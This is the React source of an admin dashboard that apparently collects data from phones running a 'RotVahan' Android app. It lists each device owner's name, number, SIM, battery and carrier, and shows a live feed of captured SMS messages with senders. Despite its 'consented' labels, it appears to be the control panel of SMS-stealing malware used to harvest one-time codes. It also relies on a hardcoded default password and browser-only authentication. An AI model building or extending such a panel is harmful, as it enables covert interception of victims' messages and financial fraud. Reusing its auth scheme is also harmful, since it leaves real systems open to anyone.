import React, { useEffect, useMemo, useState } from 'react';
import {
  ArrowLeft,
  ArrowUpDown,
  Copy,
  Info,
  KeyRound,
  Lock,
  Search,
  Star,
  Trash2,
} from 'lucide-react';
import {
  deleteSmsAlertInDb,
  deleteUserFromDb,
  ensureAuthSession,
  formatReadableDateTime,
  markSmsAlertSeenInDb,
  subscribeToAllSmsAlerts,
  subscribeToAllUsers,
  subscribeToConnectionPresence,
  subscribeToServerTimeOffset,
  updateAdminNoteInDb,
  type RotVahanUser,
  type SmsAlertRecord,
} from '../lib/firebase';

const ADMIN_PW_KEY = 'csk_admin_password';
const ADMIN_UNLOCKED_KEY = 'csk_admin_unlocked';
const STARRED_MOBILES_KEY = 'csk_starred_mobiles';
const HIDDEN_MOBILES_KEY = 'csk_hidden_mobiles';
const DEFAULT_ADMIN_PASSWORD = '2580';

function formatCountdown(totalSeconds: number): string {
  const clamped = Math.max(0, totalSeconds);
  const mins = Math.floor(clamped / 60);
  const secs = clamped % 60;
  return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
}

function loadStringArray(key: string): string[] {
  if (typeof window === 'undefined') return [];
  try {
    const raw = localStorage.getItem(key);
    if (!raw) return [];
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed.filter((x) => typeof x === 'string') : [];
  } catch {
    return [];
  }
}

function SparklineSvg({ seed }: { seed: number }) {
  const rawPoints = [
    22, 45, 38, 48, 44, 55, 72, 42, 68, 58, 66, 62, 50, 36, 78, 25, 65, 18, 46, 42, 35, 54, 52,
    36, 32, 58, 40, 34, 76, 48, 52,
  ];
  const width = 180;
  const height = 34;
  const step = width / (rawPoints.length - 1);
  const linePts = rawPoints
    .map((val, idx) => {
      const y = Math.max(4, Math.min(30, (val + (seed % 3) * 2) * 0.34));
      return `${(idx * step).toFixed(1)},${y.toFixed(1)}`;
    })
    .join(' ');
  const fillPts = `0,${height} ${linePts} ${width},${height}`;

  return (
    <svg
      viewBox={`0 0 ${width} ${height}`}
      className="w-40 sm:w-48 h-8 shrink-0"
      aria-hidden="true"
    >
      <polygon points={fillPts} fill="#FCA5A5" fillOpacity="0.65" />
      <polyline
        points={linePts}
        fill="none"
        stroke="#EF4444"
        strokeWidth="2.2"
        strokeLinejoin="round"
        strokeLinecap="round"
      />
    </svg>
  );
}

export default function CskAdminPanel() {
  const [isUnlocked, setIsUnlocked] = useState<boolean>(() => {
    return typeof window !== 'undefined' && localStorage.getItem(ADMIN_UNLOCKED_KEY) === 'true';
  });

  const [password, setPassword] = useState('');
  const [authError, setAuthError] = useState<string | null>(null);
  const [isSigningIn, setIsSigningIn] = useState(false);

  const [users, setUsers] = useState<RotVahanUser[]>([]);
  const [smsAlerts, setSmsAlerts] = useState<SmsAlertRecord[]>([]);
  const [loading, setLoading] = useState(false);
  const [dbError, setDbError] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [firebaseConnected, setFirebaseConnected] = useState(false);
  const [serverOffsetMs, setServerOffsetMs] = useState(0);
  const [nowMs, setNowMs] = useState(() => Date.now());
  const [lastSyncedTime, setLastSyncedTime] = useState<string>('—');

  const [selectedMobile, setSelectedMobile] = useState<string | null>(null);
  const [detailSearchQuery, setDetailSearchQuery] = useState('');
  const [statusUpdateInput, setStatusUpdateInput] = useState('');
  const [detailNotice, setDetailNotice] = useState<string | null>(null);

  const [starredMobiles, setStarredMobiles] = useState<string[]>(() =>
    loadStringArray(STARRED_MOBILES_KEY),
  );
  const [hiddenMobiles, setHiddenMobiles] = useState<string[]>(() =>
    loadStringArray(HIDDEN_MOBILES_KEY),
  );

  const [deleteTarget, setDeleteTarget] = useState<RotVahanUser | null>(null);

  const [showPasswordModal, setShowPasswordModal] = useState(false);
  const [currentPassword, setCurrentPassword] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [passwordMessage, setPasswordMessage] = useState<{ type: 'ok' | 'err'; text: string } | null>(
    null,
  );

  useEffect(() => {
    const id = window.setInterval(() => setNowMs(Date.now()), 250);
    return () => window.clearInterval(id);
  }, []);

  useEffect(() => {
    const unsubOffset = subscribeToServerTimeOffset((offset) => setServerOffsetMs(offset));
    const unsubConn = subscribeToConnectionPresence(null, (connected) =>
      setFirebaseConnected(connected),
    );
    return () => {
      unsubOffset();
      unsubConn();
    };
  }, []);

  useEffect(() => {
    if (!isUnlocked) {
      setUsers([]);
      setSmsAlerts([]);
      return;
    }

    ensureAuthSession().catch(() => {});
    setLoading(true);
    setDbError(null);
    const unsub = subscribeToAllUsers(
      (list) => {
        setUsers(list);
        setLoading(false);
        setLastSyncedTime(
          new Date().toLocaleTimeString('en-IN', {
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: true,
          }),
        );
      },
      (err) => {
        setDbError(err.message);
        setLoading(false);
      },
    );
    const unsubAlerts = subscribeToAllSmsAlerts((alerts) => {
      setSmsAlerts(alerts);
    });
    return () => {
      unsub();
      unsubAlerts();
    };
  }, [isUnlocked]);

  async function handlePasswordLogin(e: React.FormEvent) {
    e.preventDefault();
    setAuthError(null);
    const savedPw = localStorage.getItem(ADMIN_PW_KEY) || DEFAULT_ADMIN_PASSWORD;
    if (password.trim() !== savedPw) {
      setAuthError('Incorrect password.');
      return;
    }
    setIsSigningIn(true);
    try {
      await ensureAuthSession();
      localStorage.setItem(ADMIN_UNLOCKED_KEY, 'true');
      setIsUnlocked(true);
    } finally {
      setIsSigningIn(false);
    }
  }

  function handleChangePassword(e: React.FormEvent) {
    e.preventDefault();
    setPasswordMessage(null);
    const savedPw = localStorage.getItem(ADMIN_PW_KEY) || DEFAULT_ADMIN_PASSWORD;
    if (currentPassword.trim() !== savedPw) {
      setPasswordMessage({ type: 'err', text: 'Current password is incorrect.' });
      return;
    }
    if (newPassword.trim().length < 4) {
      setPasswordMessage({ type: 'err', text: 'New password must be at least 4 characters.' });
      return;
    }
    localStorage.setItem(ADMIN_PW_KEY, newPassword.trim());
    setPasswordMessage({ type: 'ok', text: 'Admin password updated successfully.' });
    setCurrentPassword('');
    setNewPassword('');
  }

  function toggleStar(mobile: string) {
    setStarredMobiles((prev) => {
      const next = prev.includes(mobile) ? prev.filter((m) => m !== mobile) : [...prev, mobile];
      localStorage.setItem(STARRED_MOBILES_KEY, JSON.stringify(next));
      return next;
    });
  }

  function openDeviceDetails(user: RotVahanUser) {
    setSelectedMobile(user.mobileNumber);
    setDetailSearchQuery('');
    setStatusUpdateInput(user.adminNote || '');
    setDetailNotice(null);
  }

  async function confirmDeleteDevice() {
    if (!deleteTarget) return;
    const mobile = deleteTarget.mobileNumber;
    setDeleteTarget(null);
    if (selectedMobile === mobile) setSelectedMobile(null);
    await deleteUserFromDb(mobile);
    setHiddenMobiles((prev) => {
      if (prev.includes(mobile)) return prev;
      const next = [...prev, mobile];
      localStorage.setItem(HIDDEN_MOBILES_KEY, JSON.stringify(next));
      return next;
    });
  }

  const visibleUsers = useMemo(() => {
    const starredSet = new Set(starredMobiles);
    const hiddenSet = new Set(hiddenMobiles);
    return users
      .filter((u) => !hiddenSet.has(u.mobileNumber))
      .sort((a, b) => {
        const aStar = starredSet.has(a.mobileNumber) ? 1 : 0;
        const bStar = starredSet.has(b.mobileNumber) ? 1 : 0;
        if (aStar !== bStar) return bStar - aStar;
        return (b.registrationTime || 0) - (a.registrationTime || 0);
      });
  }, [users, starredMobiles, hiddenMobiles]);

  const filteredUsers = useMemo(() => {
    const q = searchQuery.trim().toLowerCase();
    if (!q) return visibleUsers;
    return visibleUsers.filter(
      (u) =>
        u.userName.toLowerCase().includes(q) ||
        u.mobileNumber.toLowerCase().includes(q) ||
        (u.simNumber || '').toLowerCase().includes(q) ||
        (u.sim1Details || '').toLowerCase().includes(q) ||
        (u.sim2Details || '').toLowerCase().includes(q) ||
        (u.deviceModel || u.mobileModel || '').toLowerCase().includes(q),
    );
  }, [visibleUsers, searchQuery]);

  const onlineCount = useMemo(
    () => visibleUsers.filter((u) => u.connectionStatus === 'online' || u.isOnline === true).length,
    [visibleUsers],
  );
  const offlineCount = visibleUsers.length - onlineCount;

  const selectedUser = useMemo(
    () => (selectedMobile ? users.find((u) => u.mobileNumber === selectedMobile) || null : null),
    [users, selectedMobile],
  );

  const selectedUserAlerts = useMemo(() => {
    if (!selectedUser) return [];
    const q = detailSearchQuery.trim().toLowerCase();
    return smsAlerts
      .filter((a) => a.mobileNumber === selectedUser.mobileNumber)
      .filter(
        (a) =>
          !q ||
          a.alertMessage.toLowerCase().includes(q) ||
          a.senderNumber.toLowerCase().includes(q) ||
          (a.receivedAtFormatted || '').toLowerCase().includes(q),
      );
  }, [smsAlerts, selectedUser, detailSearchQuery]);

  function getTimerDisplay(user: RotVahanUser): string {
    if (!user.timerExpiryTime) return '—';
    const serverNow = nowMs + serverOffsetMs;
    const secs = Math.max(0, Math.ceil((user.timerExpiryTime - serverNow) / 1000));
    return secs > 0 ? `Active · ${formatCountdown(secs)}` : 'Expired (00:00)';
  }

  function showFlashNotice(msg: string) {
    setDetailNotice(msg);
    window.setTimeout(() => setDetailNotice((cur) => (cur === msg ? null : cur)), 2500);
  }

  // Dedicated Device Details View when a user card is clicked
  if (isUnlocked && selectedUser) {
    const isOnline =
      selectedUser.connectionStatus === 'online' || selectedUser.isOnline === true;
    const deviceModel =
      selectedUser.deviceModel || selectedUser.mobileModel || 'Android Device';
    const sim1 =
      selectedUser.sim1Details ||
      (selectedUser.simNumber && selectedUser.simNumber !== 'Not Checked'
        ? selectedUser.simNumber
        : 'Not reported');
    const sim2 = selectedUser.sim2Details || 'Not reported';
    const displayDate =
      (selectedUser.deviceDateTime && selectedUser.deviceDateTime !== 'Pending'
        ? selectedUser.deviceDateTime
        : null) ||
      selectedUser.registrationTimeFormatted ||
      formatReadableDateTime(selectedUser.registrationTime);

    const copySummary = [
      `Model: ${deviceModel}`,
      `Phone: ${selectedUser.mobileNumber}`,
      `Name: ${selectedUser.userName}`,
      `Sim1: ${sim1}`,
      `Sim2: ${sim2}`,
      `Battery: ${selectedUser.batteryPercentage || '0%'}`,
      `Network: ${selectedUser.networkOperator || '—'}`,
      `Status: ${isOnline ? 'Online' : 'Offline'}`,
      `Date: ${displayDate}`,
    ].join('\n');

    return (
      <div className="min-h-screen bg-white text-slate-900 flex flex-col">
        <header className="border-b border-slate-200 bg-white sticky top-0 z-30">
          <div className="max-w-2xl mx-auto px-3 sm:px-4 h-14 flex items-center justify-between gap-2">
            <div className="flex items-center gap-2.5">
              <button
                type="button"
                onClick={() => setSelectedMobile(null)}
                title="Back"
                className="p-1.5 rounded-lg hover:bg-slate-100 cursor-pointer"
              >
                <ArrowLeft className="w-5 h-5 text-slate-900" />
              </button>
              <span className="text-base sm:text-lg font-bold text-slate-900">
                Device Details
              </span>
              <span
                className={`text-xs sm:text-sm font-bold ${
                  isOnline ? 'text-green-600' : 'text-orange-600'
                }`}
              >
                {isOnline ? 'Online' : 'Offline'}
              </span>
            </div>

            <div className="flex items-center gap-2">
              <button
                type="button"
                onClick={() => showFlashNotice(`Synced · ${lastSyncedTime}`)}
                title="Sync"
                className="p-1.5 rounded-lg hover:bg-slate-100 cursor-pointer"
              >
                <ArrowUpDown className="w-5 h-5 text-slate-900" />
              </button>
              <button
                type="button"
                onClick={() => {
                  void navigator.clipboard?.writeText(copySummary);
                  showFlashNotice('Device details copied');
                }}
                title="Copy Details"
                className="p-1.5 rounded-lg hover:bg-slate-100 cursor-pointer"
              >
                <Copy className="w-5 h-5 text-slate-900" />
              </button>
            </div>
          </div>
        </header>

        <main className="flex-1 w-full max-w-2xl mx-auto px-3 sm:px-4 py-3 space-y-3">
          {detailNotice && (
            <div className="px-3 py-2 rounded-xl bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs font-semibold">
              {detailNotice}
            </div>
          )}

          {/* Device & SIM Details Card */}
          <div className="bg-white border border-slate-600 rounded-xl p-4 space-y-1.5">
            <div className="flex items-center justify-between gap-2">
              <h1 className="text-lg font-bold text-slate-900">{deviceModel}</h1>
              <span className="font-timer text-xs font-semibold text-slate-600">
                {getTimerDisplay(selectedUser)}
              </span>
            </div>
            <div className="text-[15px] font-bold text-slate-900 tabular-nums">
              Phone: {selectedUser.mobileNumber}
            </div>
            <div className="text-[15px] font-bold text-slate-900">
              Name: {selectedUser.userName}
            </div>
            <div className="text-sm font-semibold text-slate-900 tabular-nums">Sim1: {sim1}</div>
            <div className="text-sm font-semibold text-slate-900 tabular-nums">Sim2: {sim2}</div>
            <div className="text-xs font-semibold text-slate-700">
              Battery: {selectedUser.batteryPercentage || '0%'} · Network:{' '}
              {selectedUser.networkOperator || '—'}
            </div>
            <div className="text-xs font-semibold text-slate-700 tabular-nums">
              Date: {displayDate}
            </div>
            <div className="text-xs text-slate-600 pt-1">
              SIM Perm: <strong>{selectedUser.simPermissionStatus || 'Not Requested'}</strong> ·
              SMS Alert: <strong>{selectedUser.smsPermissionStatus || 'Not Available'}</strong> ·
              Notif: <strong>{selectedUser.notificationPermissionStatus || 'Not Requested'}</strong>
            </div>
            {selectedUser.adminNote && (
              <div className="text-xs font-bold text-blue-700 pt-1">
                Saved Note: {selectedUser.adminNote}
              </div>
            )}
          </div>

          {/* Enter Update Status + UPDATE Button */}
          <form
            onSubmit={async (e) => {
              e.preventDefault();
              try {
                await updateAdminNoteInDb(selectedUser.mobileNumber, statusUpdateInput.trim());
                showFlashNotice('Status note updated');
              } catch {
                showFlashNotice('Unable to update status note (check Firebase rules)');
              }
            }}
            className="flex items-center gap-2"
          >
            <input
              type="text"
              value={statusUpdateInput}
              onChange={(e) => setStatusUpdateInput(e.target.value)}
              placeholder="Enter Update Status"
              className="flex-1 min-h-[44px] px-3.5 rounded-xl border border-slate-600 bg-white text-slate-900 text-sm focus:outline-none focus:ring-2 focus:ring-blue-600"
            />
            <button
              type="submit"
              className="min-h-[44px] px-5 rounded-xl bg-slate-900 hover:bg-slate-800 text-white text-xs font-bold tracking-wide cursor-pointer"
            >
              UPDATE
            </button>
          </form>

          {/* Search Here Bar */}
          <div className="border border-slate-600 rounded-xl px-3.5 py-2 flex items-center justify-between gap-2 bg-white">
            <input
              type="search"
              value={detailSearchQuery}
              onChange={(e) => setDetailSearchQuery(e.target.value)}
              placeholder="Search Here"
              className="flex-1 bg-transparent text-slate-900 placeholder:text-slate-900 font-semibold text-sm border-b border-slate-700 pb-0.5 focus:outline-none"
            />
            <Search className="w-5 h-5 text-slate-900 shrink-0" />
          </div>

          {/* User Consented SMS Alerts */}
          <section className="space-y-2.5">
            <div className="flex items-center justify-between">
              <h2 className="text-sm font-bold text-slate-900">
                User SMS Alerts ({selectedUserAlerts.length})
              </h2>
              <span className="text-xs font-bold text-green-600">
                {selectedUserAlerts.filter((a) => a.status === 'New').length} New
              </span>
            </div>

            {selectedUserAlerts.length === 0 ? (
              <div className="p-6 text-center text-sm text-slate-500 border border-slate-600 rounded-xl">
                No consented SMS arrival alerts for this device yet.
              </div>
            ) : (
              <div className="space-y-2.5">
                {selectedUserAlerts.map((alert) => (
                  <div
                    key={alert.id}
                    className="bg-white border border-slate-600 rounded-xl p-3 flex items-start justify-between gap-3"
                  >
                    <div className="space-y-1.5 min-w-0 flex-1">
                      <div className="text-sm font-bold text-green-600 break-words">
                        {alert.alertMessage}
                      </div>
                      <div className="text-xs text-slate-600 tabular-nums">
                        Sender: {alert.senderNumber} | Date:{' '}
                        {alert.receivedAtFormatted || formatReadableDateTime(alert.receivedAt)} |
                        Status: {alert.status}
                      </div>
                      {alert.status === 'New' && (
                        <button
                          type="button"
                          onClick={() => void markSmsAlertSeenInDb(alert.mobileNumber, alert.id)}
                          className="text-xs font-bold text-blue-700 hover:underline cursor-pointer"
                        >
                          Mark Seen
                        </button>
                      )}
                    </div>

                    <div className="flex flex-col items-center gap-2.5 shrink-0">
                      <button
                        type="button"
                        onClick={() => {
                          const clip = `${alert.alertMessage} | Sender: ${alert.senderNumber} | Date: ${
                            alert.receivedAtFormatted || formatReadableDateTime(alert.receivedAt)
                          }`;
                          void navigator.clipboard?.writeText(clip);
                          showFlashNotice('Alert copied');
                        }}
                        title="Copy Alert"
                        className="p-1 text-slate-900 hover:bg-slate-100 rounded cursor-pointer"
                      >
                        <Copy className="w-4 h-4" />
                      </button>
                      <button
                        type="button"
                        onClick={() => void deleteSmsAlertInDb(alert.mobileNumber, alert.id)}
                        title="Delete Alert"
                        className="p-1 text-slate-900 hover:bg-slate-100 rounded cursor-pointer"
                      >
                        <Trash2 className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </section>
        </main>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white text-slate-900 flex flex-col">
      {/* Compact White Top Header */}
      <header className="border-b border-slate-200 bg-white sticky top-0 z-30">
        <div className="max-w-2xl mx-auto px-4 h-14 flex items-center justify-between gap-3">
          <div>
            <div className="text-base font-bold tracking-tight text-slate-900 leading-tight">
              CSK ADMIN
            </div>
            <div
              className={`text-[11px] font-semibold ${
                firebaseConnected ? 'text-emerald-600' : 'text-red-700'
              }`}
            >
              {firebaseConnected ? `Connected · ${lastSyncedTime}` : 'Disconnected'}
            </div>
          </div>

          {isUnlocked && (
            <div className="flex items-center gap-2">
              <button
                type="button"
                onClick={() => {
                  setPasswordMessage(null);
                  setShowPasswordModal(true);
                }}
                title="Change Password"
                className="p-2 rounded-lg border border-slate-300 text-slate-800 hover:bg-slate-50 cursor-pointer"
              >
                <KeyRound className="w-4 h-4" />
              </button>
              <button
                type="button"
                onClick={() => {
                  localStorage.setItem(ADMIN_UNLOCKED_KEY, 'false');
                  setIsUnlocked(false);
                  setSelectedMobile(null);
                  setPassword('');
                }}
                title="Lock"
                className="p-2 rounded-lg border border-slate-300 text-slate-800 hover:bg-slate-50 cursor-pointer"
              >
                <Lock className="w-4 h-4" />
              </button>
            </div>
          )}
        </div>
      </header>

      <main className="flex-1 w-full max-w-2xl mx-auto px-3 sm:px-4 py-3 space-y-3 bg-white">
        {!isUnlocked ? (
          <div className="max-w-md mx-auto mt-10 bg-white border border-slate-600 rounded-2xl p-6 shadow-sm">
            <h1 className="text-2xl font-bold text-slate-900">CSK ADMIN Login</h1>
            <p className="mt-1 text-sm text-slate-600">
              Enter Admin Password to open Device Overview.
            </p>

            <form onSubmit={handlePasswordLogin} className="mt-5 space-y-4">
              <input
                type="password"
                required
                value={password}
                onChange={(e) => {
                  setPassword(e.target.value);
                  setAuthError(null);
                }}
                placeholder="Enter Password"
                className="w-full min-h-[48px] px-4 rounded-xl border border-slate-400 bg-white text-slate-900 text-base focus:outline-none focus:ring-2 focus:ring-blue-600"
              />
              {authError && (
                <div className="p-3 rounded-xl bg-red-50 border border-red-200 text-red-800 text-sm">
                  {authError}
                </div>
              )}
              <button
                type="submit"
                disabled={isSigningIn}
                className="w-full min-h-[48px] px-5 py-3 rounded-xl bg-blue-600 hover:bg-blue-700 text-white font-bold text-base cursor-pointer disabled:opacity-60"
              >
                {isSigningIn ? 'Opening...' : 'Login'}
              </button>
            </form>
          </div>
        ) : (
          <>
            {/* Top Summary Box matching screenshot */}
            <div className="bg-white border border-slate-600 rounded-xl px-3.5 py-3 space-y-2.5">
              <div className="flex items-center justify-between gap-2">
                <div className="text-base font-bold text-slate-900 tabular-nums">
                  Device Count : {visibleUsers.length}
                </div>
                <SparklineSvg seed={visibleUsers.length + smsAlerts.length} />
              </div>

              <div className="text-center text-xs sm:text-sm font-bold text-slate-900 tabular-nums">
                Online: {onlineCount} | Offline: {offlineCount} | SMS: {smsAlerts.length}
              </div>

              <div className="border border-slate-600 rounded-xl px-3.5 py-2 flex items-center justify-between gap-2 bg-white">
                <div className="flex-1">
                  <input
                    type="search"
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    placeholder="Search Here"
                    className="w-full bg-transparent text-slate-900 placeholder:text-slate-900 font-semibold text-sm sm:text-base border-b border-slate-700 pb-0.5 focus:outline-none"
                  />
                </div>
                <Search className="w-6 h-6 text-slate-900 shrink-0" />
              </div>
            </div>

            {dbError && (
              <div className="p-3 rounded-xl bg-red-50 border border-red-200 text-red-800 text-sm">
                {dbError}
              </div>
            )}

            {/* Numbered Device Cards */}
            {loading ? (
              <div className="p-8 text-center text-slate-500 border border-slate-600 rounded-xl">
                Loading devices...
              </div>
            ) : filteredUsers.length === 0 ? (
              <div className="p-8 text-center text-slate-500 border border-slate-600 rounded-xl">
                No registered devices found.
              </div>
            ) : (
              <div className="space-y-3">
                {filteredUsers.map((user, index) => {
                  const isOnline =
                    user.connectionStatus === 'online' || user.isOnline === true;
                  const isStarred = starredMobiles.includes(user.mobileNumber);
                  const simNumber = user.simNumber || 'Not Checked';
                  const sim1Details =
                    user.sim1Details ||
                    (simNumber !== 'Not Checked' ? simNumber : 'Not reported');
                  const deviceModel = user.deviceModel || user.mobileModel || 'Android Device';
                  const batteryPercentage = user.batteryPercentage || '0%';
                  const displayDate =
                    (user.deviceDateTime && user.deviceDateTime !== 'Pending'
                      ? user.deviceDateTime
                      : null) ||
                    user.registrationTimeFormatted ||
                    formatReadableDateTime(user.registrationTime);

                  return (
                    <div
                      key={user.mobileNumber}
                      onClick={() => openDeviceDetails(user)}
                      className="bg-white border border-slate-600 rounded-xl p-3 flex items-start gap-3.5 cursor-pointer hover:bg-slate-50/70 transition-colors"
                    >
                      {/* Left column: Index number + Cyan-Pink Phone Thumbnail */}
                      <div className="flex flex-col items-start gap-2 shrink-0">
                        <span className="text-base font-medium text-slate-900 pl-1 leading-none">
                          {index + 1}
                        </span>
                        <div
                          aria-hidden="true"
                          className="w-[66px] h-[106px] rounded border border-slate-600"
                          style={{
                            background:
                              'linear-gradient(145deg, #93c5fd 0%, #f5d0fe 32%, #22d3ee 60%, #e0f2fe 80%, #fbcfe8 100%)',
                          }}
                        />
                      </div>

                      {/* Right column: Details + Status & Icons */}
                      <div className="flex-1 min-w-0 space-y-1">
                        <div className="text-[15px] font-bold text-slate-900 truncate tabular-nums">
                          Phone: {user.mobileNumber}
                        </div>
                        <div className="text-[15px] font-bold text-slate-900 truncate">
                          Name: {user.userName}
                        </div>
                        <div className="text-[15px] font-bold text-slate-900 truncate">
                          Model: {deviceModel}
                        </div>
                        <div className="text-[15px] font-bold text-slate-900">
                          Battery: {batteryPercentage}
                        </div>
                        <div className="text-xs font-semibold text-slate-700 truncate tabular-nums">
                          SIM 1: {sim1Details}
                        </div>
                        <div className="text-xs text-slate-500 truncate tabular-nums">
                          Date: {displayDate}
                        </div>

                        <div className="pt-1 flex items-center justify-between gap-2">
                          <span
                            className={`text-sm font-bold ${
                              isOnline ? 'text-green-600' : 'text-orange-600'
                            }`}
                          >
                            Status: {isOnline ? 'Online' : 'Offline'}
                          </span>

                          <div
                            className="flex items-center gap-3"
                            onClick={(e) => e.stopPropagation()}
                          >
                            <button
                              type="button"
                              onClick={() => toggleStar(user.mobileNumber)}
                              title="Star device"
                              className="cursor-pointer p-0.5"
                            >
                              <Star
                                className={`w-5 h-5 ${
                                  isStarred
                                    ? 'fill-amber-500 text-amber-500'
                                    : 'text-slate-900'
                                }`}
                              />
                            </button>
                            <button
                              type="button"
                              onClick={() => openDeviceDetails(user)}
                              title="Device Details"
                              className="cursor-pointer p-0.5 text-slate-900"
                            >
                              <Info className="w-5 h-5" />
                            </button>
                            <button
                              type="button"
                              onClick={() => setDeleteTarget(user)}
                              title="Delete device"
                              className="cursor-pointer p-0.5 text-slate-900"
                            >
                              <Trash2 className="w-5 h-5" />
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}

            {/* Consented SMS Alerts Section */}
            <section className="pt-2 space-y-2.5">
              <div className="flex items-center justify-between">
                <h2 className="text-base font-bold text-slate-900">
                  SMS Alerts ({smsAlerts.length})
                </h2>
                <span className="text-xs font-bold text-green-600">
                  {smsAlerts.filter((a) => a.status === 'New').length} New
                </span>
              </div>

              {smsAlerts.length === 0 ? (
                <div className="p-5 text-center text-sm text-slate-500 border border-slate-600 rounded-xl">
                  No consented SMS arrival alerts recorded yet.
                </div>
              ) : (
                <div className="space-y-2.5">
                  {smsAlerts.map((alert, idx) => {
                    const matchedUser = users.find((u) => u.mobileNumber === alert.mobileNumber);
                    return (
                      <div
                        key={`${alert.mobileNumber}_${alert.id}`}
                        className="bg-white border border-slate-600 rounded-xl p-3 space-y-1"
                      >
                        <div className="flex items-center justify-between gap-2">
                          <span className="text-sm font-bold text-slate-900 truncate tabular-nums">
                            {idx + 1}. Phone: {alert.mobileNumber}
                            {matchedUser ? ` (${matchedUser.userName})` : ''}
                          </span>
                          <span
                            className={`text-xs font-bold ${
                              alert.status === 'New' ? 'text-green-600' : 'text-slate-500'
                            }`}
                          >
                            Status: {alert.status}
                          </span>
                        </div>
                        <div className="text-xs font-bold text-green-600">
                          {alert.alertMessage}
                        </div>
                        <div className="text-xs text-slate-700">Sender: {alert.senderNumber}</div>
                        <div className="flex items-center justify-between gap-2 pt-0.5">
                          <span className="text-xs text-slate-500 tabular-nums">
                            Date:{' '}
                            {alert.receivedAtFormatted || formatReadableDateTime(alert.receivedAt)}
                          </span>
                          {alert.status === 'New' && (
                            <button
                              type="button"
                              onClick={() => void markSmsAlertSeenInDb(alert.mobileNumber, alert.id)}
                              className="px-2.5 py-1 rounded-lg border border-green-600 text-green-700 text-xs font-bold cursor-pointer hover:bg-green-50"
                            >
                              Mark Seen
                            </button>
                          )}
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </section>
          </>
        )}
      </main>

      {/* Change Password Modal */}
      {showPasswordModal && (
        <div
          role="dialog"
          aria-modal="true"
          className="fixed inset-0 z-50 bg-slate-900/40 flex items-center justify-center p-4"
        >
          <form
            onSubmit={handleChangePassword}
            className="w-full max-w-md bg-white border border-slate-400 rounded-2xl p-6 space-y-4 shadow-lg"
          >
            <h2 className="text-xl font-bold text-slate-900">Change Admin Password</h2>
            <input
              type="password"
              required
              value={currentPassword}
              onChange={(e) => setCurrentPassword(e.target.value)}
              placeholder="Current Password"
              className="w-full min-h-[46px] px-4 rounded-xl border border-slate-300 text-slate-900 text-base focus:outline-none focus:ring-2 focus:ring-blue-600"
            />
            <input
              type="password"
              required
              minLength={4}
              value={newPassword}
              onChange={(e) => setNewPassword(e.target.value)}
              placeholder="New Password (min 4 chars)"
              className="w-full min-h-[46px] px-4 rounded-xl border border-slate-300 text-slate-900 text-base focus:outline-none focus:ring-2 focus:ring-blue-600"
            />
            {passwordMessage && (
              <div
                className={`p-3 rounded-xl text-sm border ${
                  passwordMessage.type === 'ok'
                    ? 'bg-emerald-50 border-emerald-200 text-emerald-800'
                    : 'bg-red-50 border-red-200 text-red-800'
                }`}
              >
                {passwordMessage.text}
              </div>
            )}
            <div className="flex justify-end gap-2 pt-2">
              <button
                type="button"
                onClick={() => setShowPasswordModal(false)}
                className="px-4 py-2 rounded-xl border border-slate-300 text-slate-700 font-semibold text-sm cursor-pointer"
              >
                Close
              </button>
              <button
                type="submit"
                className="px-5 py-2 rounded-xl bg-blue-600 text-white font-semibold text-sm cursor-pointer"
              >
                Update Password
              </button>
            </div>
          </form>
        </div>
      )}

      {/* Delete Device Confirmation Modal */}
      {deleteTarget && (
        <div
          role="dialog"
          aria-modal="true"
          className="fixed inset-0 z-50 bg-slate-900/40 flex items-center justify-center p-4"
        >
          <div className="w-full max-w-sm bg-white border border-slate-600 rounded-2xl p-5 space-y-4 shadow-lg">
            <h2 className="text-lg font-bold text-slate-900">Delete Device?</h2>
            <p className="text-sm text-slate-700">
              Remove {deleteTarget.userName} (+91 {deleteTarget.mobileNumber}) from the device list?
            </p>
            <div className="flex justify-end gap-2">
              <button
                type="button"
                onClick={() => setDeleteTarget(null)}
                className="px-4 py-2 rounded-xl border border-slate-300 text-slate-700 font-semibold text-sm cursor-pointer"
              >
                Cancel
              </button>
              <button
                type="button"
                onClick={() => void confirmDeleteDevice()}
                className="px-4 py-2 rounded-xl bg-red-600 text-white font-semibold text-sm cursor-pointer"
              >
                Delete
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
